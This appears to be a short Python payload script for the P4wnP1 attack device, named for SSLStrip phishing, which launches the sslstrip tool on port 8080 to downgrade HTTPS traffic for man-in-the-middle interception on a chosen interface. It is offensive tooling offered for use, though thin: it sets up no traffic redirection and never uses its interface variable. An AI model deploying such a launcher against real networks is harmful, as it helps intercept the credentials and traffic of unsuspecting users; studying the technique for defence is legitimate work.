# File: /opt/p4wnp1/payloads/network/sslstrip_phishing.py
import subprocess
import os

iface = os.environ.get("IFACE", "usb0")

print(f"[*] Starting SSLStrip on interface: {iface}")

try:
    subprocess.run(["sslstrip", "-l", "8080"])
except FileNotFoundError:
    print("[!] sslstrip not found. Please install it first.")
except KeyboardInterrupt:
    print("[!] SSLStrip interrupted.")
